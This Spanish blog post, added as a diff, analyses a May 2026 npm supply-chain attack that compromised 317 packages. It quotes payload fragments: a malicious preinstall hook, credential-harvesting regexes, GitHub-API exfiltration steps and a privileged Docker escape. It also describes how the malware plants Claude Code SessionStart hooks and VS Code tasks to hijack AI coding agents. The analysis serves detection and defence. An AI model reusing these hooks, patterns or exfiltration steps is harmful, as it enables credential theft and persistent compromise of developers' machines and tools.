@@ -1,0 +1,147 @@
+---
+title: "Shai-Hulud: 317 paquetes npm comprometidos en 22 minutos"
+date: "2026-05-19T12:33"
+tags: ["npm", "seguridad", "supply-chain", "javascript", "malware"]
+excerpt: "Un atacante comprometió la cuenta npm 'atool' y publicó 637 versiones maliciosas en 317 paquetes. El payload roba credenciales y secuestra agentes de IA."
+---
+
+El 19 de mayo de 2026, a la 1:39 UTC, alguien tomó el control de la cuenta npm `atool`. En los siguientes 22 minutos, esa cuenta publicó **637 versiones maliciosas** repartidas entre **317 paquetes**. Entre las víctimas hay paquetes con millones de descargas mensuales: `size-sensor` (4.2M), `echarts-for-react` (3.8M), `@antv/scale` (2.2M), `timeago.js` (1.15M). La gran mayoría son librerías del ecosistema AntV, el framework de visualización de datos de Alibaba.
+
+No fue un ataque oportunista. El payload es un script Bun de 498KB con doble capa de ofuscación, firmado con RSA-PSS para control remoto y diseñado para sobrevivir a limpiezas parciales usando commits huérfanos en repositorios legítimos de GitHub como respaldo. El equipo de [SafeDep](https://safedep.io) lo ha documentado con un nivel de detalle quirúrgico.
+
+## Mini Shai-Hulud: un toolkit que no es nuevo
+
+El análisis forense confirma que este payload es prácticamente idéntico al usado en el ataque a SAP hace tres semanas. Mismo patrón de ofuscación (lookup table hexadecimal + XOR con base64), misma arquitectura de escáneres con buffer de 100KB, mismas expresiones regulares para detectar credenciales. El atacante tiene un toolkit y lo está reutilizando. Lo llaman **Mini Shai-Hulud**, por la obsesión del autor con Dune: los repositorios de exfiltración tienen nombres como `fremen-sandworm-427` o `atreides-stillsuit-88`.
+
+La buena noticia: tener un modus operandi repetido hace que sea detectable. La mala: si ha funcionado dos veces en tres semanas, probablemente no será la última.
+
+## Cómo se ejecuta el ataque
+
+Cada versión comprometida añade dos cosas a su `package.json`:
+
+```json
+{
+  "scripts": {
+    "preinstall": "bun run index.js"
+  },
+  "optionalDependencies": {
+    "@antv/setup": "github:antvis/G2#1916faa365f2788b6e193514872d51a242876569"
+  }
+}
+```
+
+El hook `preinstall` se ejecuta antes de instalar cualquier dependencia. Solo necesita que tengas Bun disponible — algo no tan raro en 2026. La entrada en `optionalDependencies` es más astuta: apunta a un **commit huérfano** en el repositorio legítimo `antvis/G2`. Ese commit nunca aparece en ningún branch, así que los mantenedores del repo no lo ven. Pero GitHub lo conserva porque su modelo de objetos Git lo trata como alcanzable. npm lo resuelve sin rechistar, descarga el SHA y ejecuta el código. Incluso si bloqueas los hooks `preinstall`, el payload entra por la puerta de atrás.
+
+El archivo `index.js` es un bundle ofuscado de Bun de 498KB en una sola línea. Sus imports lo dicen todo:
+
+```javascript
+import { execSync, spawn } from 'child_process';
+import { homedir } from 'os';
+import { readFile, readFileSync, writeFileSync, createWriteStream } from 'fs';
+import { createHash, createDecipheriv, pbkdf2Sync, generateKeyPairSync, sign } from 'crypto';
+import { pipeline } from 'stream/promises';
+```
+
+Con esto el payload puede ejecutar comandos, leer y escribir archivos, cifrar, firmar y comunicarse por red.
+
+## La cosecha de credenciales: todo lo que tengas
+
+El payload escanea más de 80 variables de entorno y aplica regex sobre archivos de configuración. Esto es lo que busca:
+
+```javascript
+// Patrones reales extraídos del payload (SafeDep, 2026)
+'ghtoken':    /gh[op]_[A-Za-z0-9]{36,}/g,
+'npmtoken':   /npm_[A-Za-z0-9]{36,}/g,
+'awskey':     /(AKIA[0-9A-Z]{16}|aws_access_key_id["\s:=]+["']?[A-Z0-9]{20})/g,
+'sshKey':     /ssh-(rsa|ed25519|dss) AAAA[0-9A-Za-z+\/]{100,}/g,
+'vaultToken': /hvs\.[A-Za-z0-9_-]{24,}/g,
+'stripeKey':  /(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}/g,
+'dbConnStr':  /(mongodb|mysql|postgresql|postgres|redis):\/\/[^:\s]+:[^@\s]+@[^\s'"]+/gi,
+```
+
+Pero no se queda en variables de entorno. También lee archivos: `~/.ssh`, `~/.aws/credentials`, `~/.npmrc`, `~/.docker/config.json`, `~/.kube/config`. Si detecta que está en un entorno CI, escala: en GitHub Actions llega al extremo de inyectar un workflow falso que hace `toJSON(secrets)` y se exfiltra los secretos del repositorio como artifact.
+
+El flujo completo para GitHub Actions es así:
+
+1. Crea un blob con un workflow llamado "Run Copilot" que vuelca `toJSON(secrets)` en `format-results.txt`
+2. Lo commitea en una branch `chore/add-codeql-static-analysis` usando la API de Git
+3. Espera a que el workflow se ejecute
+4. Descarga el artifact, extrae los secretos y **borra el workflow run y resetea la branch** — autolimpieza
+
+## El C2 se esconde a plena vista
+
+Aquí está una de las partes más elegantes del ataque. El payload **no llama a ningún servidor del atacante**. Toda la comunicación usa la API de GitHub, con un User-Agent falsificado como `python-requests/2.31.0`. El tráfico es indistinguible del uso normal de la API.
+
+La exfiltración funciona en tres pasos:
+
+```javascript
+// Paso 1: Validar el token robado
+GET /user                          // verificar que el token funciona
+GET /user/orgs                     // enumerar organizaciones
+// El header x-oauth-scopes revela si tiene repo o public_repo
+
+// Paso 2: Crear repo de exfiltración con nombre Dune
+POST /user/repos {
+  name: "fremen-sandworm-427",     // combinación aleatoria del vocabulario Dune
+  private: false,
+  auto_init: true,
+  description: "niagA oG eW ereH :duluH-iahS"  // "Shai-Hulud: Here We Go Again" al revés
+}
+
+// Paso 3: Committear credenciales como objetos Git
+POST /repos/{owner}/{repo}/git/blobs     // subir datos
+POST /repos/{owner}/{repo}/git/trees     // crear árbol
+POST /repos/{owner}/{repo}/git/commits   // commit
+PATCH /repos/{owner}/{repo}/git/refs/heads/main  // actualizar ref
+```
+
+Todo legítimo. Todo indetectable para un firewall que solo mira dominios. Las credenciales robadas acaban en repositorios públicos con nombres sacados de Dune y descripción invertida.
+
+Y como plus, el atacante incluye persistencia a largo plazo: un daemon Python (`kitty-monitor`) que cada hora busca en GitHub commits que contengan la keyword `firedalazer`. Si encuentra uno con un comando firmado con RSA-PSS, lo ejecuta.
+
+## Docker, Claude Code y el `tasks.json`
+
+El payload no se conforma con robar lo que hay en el entorno actual. Intenta escaparse.
+
+Si encuentra el socket de Docker (`/var/run/docker.sock`), lanza un contenedor privilegiado con bind mounts del sistema de archivos del host:
+
+```javascript
+// Construcción del contenedor de escape (SafeDep, 2026)
+{
+  'Image': /* cifrado */,
+  'Cmd': ['sh', '-c', /* comando cifrado */],
+  'HostConfig': {
+    'Privileged': true,
+    'Binds': [/* montaje del host */],
+    'AutoRemove': true
+  }
+}
+```
+
+Y luego está el asalto a los agentes de IA. Si el token de GitHub robado tiene acceso a otros repositorios, el payload les inyecta estos archivos:
+
+- `.claude/settings.json` con un hook `SessionStart` que ejecuta `node .claude/setup.mjs`
+- `.vscode/tasks.json` con `"runOn": "folderOpen"` que ejecuta el mismo bootstrapper
+- `.claude/setup.mjs`, un script de 150 líneas que descarga una versión reciente de Bun desde los releases oficiales de GitHub y re-ejecuta el payload completo
+
+El bootstrapper es multiplataforma: detecta musl/Alpine, prueba unzip, bsdtar, Python, PowerShell y hasta tiene un parser ZIP casero como fallback. Cada vez que un desarrollador abre el proyecto en VS Code o inicia Claude Code, el payload se reactiva silenciosamente.
+
+## Por qué esto es peor que un ransomware
+
+Con ransomware sabes que te han atacado: tus archivos no abren y hay una nota pidiendo bitcoin. Con esto no hay señales. Tus dependencias instalan bien. Tus tests pasan. Tu CI va verde. Mientras tanto, un repositorio público llamado `mentat-heighliner-512` contiene tus tokens de AWS, tus claves SSH y tu token de npm.
+
+Y el daño se propaga. Si usabas `echarts-for-react` con `"^3.0.6"` en tu `package.json`, cualquier `npm install` limpio resuelve a la versión `3.2.7` maliciosa. No necesitas actualizar manualmente. No necesitas aprobar nada. El versionado semántico hace el trabajo por el atacante: el `^` le dice a npm "coge la versión más alta compatible" y la más alta compatible es la que tiene el backdoor.
+
+SafeDep ha publicado los indicadores de compromiso completos:
+- **SHA256 del payload**: `a68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1c`
+- **Account**: `atool` en npm, publicaciones entre 01:44 y 02:06 UTC del 19 de mayo
+- **Commits impostores en antvis/G2**: `1916faa`, `7cb42f5`, `dc3d62a` (mensaje: "New Package")
+- **Nombres de repo**: patrón `{dune_word1}-{dune_word2}-{numero}` con descripción "Shai-Hulud: Here We Go Again"
+
+## Mi veredicto
+
+Este ataque me parece una obra de ingeniería ofensiva impresionante. No por la complejidad técnica — que la tiene — sino por el diseño de opsec: GitHub como C2, commits huérfanos como respaldo, autolimpieza de workflows, nombres que se camuflan como proyectos reales. Es malware con elegancia.
+
+Lo que más me inquieta es el gancho a los agentes de IA. Hace un año esto habría sido una curiosidad académica. Hoy, con Claude Code y Codex instalados en media industria, inyectar un `SessionStart` hook es como poner una puerta trasera en la herramienta que el desarrollador usa para escribir el resto del código. El atacante no solo roba lo que ya tienes: se asegura de estar presente en todo lo que construyas a partir de ahora.
+
+La lección para el resto de nosotros: revisad vuestros lockfiles. Si tenéis dependencias del ecosistema AntV, comprobad las versiones. Y si encontráis un `.claude/settings.json` que no pusisteis vosotros, no lo abráis — borradlo y rotad credenciales.
